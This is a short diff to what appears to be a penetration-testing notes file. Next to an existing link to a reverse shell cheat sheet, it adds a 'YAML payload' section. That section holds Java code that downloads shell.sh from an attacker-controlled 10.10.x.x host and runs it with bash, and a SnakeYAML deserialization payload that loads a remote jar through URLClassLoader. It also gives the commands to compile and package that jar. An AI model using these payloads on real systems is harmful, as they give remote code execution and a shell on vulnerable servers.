@@ -22,3 +22,20 @@ gedit /etc/hosts
 
 - Reverse Shell Cheat Sheet
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+- YAML payload
+
+try {
+     Runtime.getRuntime().exec("curl 10.10.x.x/shell.sh -o /tmp/shell.sh");
+	   Runtime.getRuntime().exec("bash /tmp/shell.sh");
+     }
+
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.x.x/yaml-payload/yaml-payload.jar"]
+  ]]
+]
+
+javac src/artsploit/AwesomeScriptEngineFactory.java
+
+jar -cvf yaml-payload.jar -C src/ .
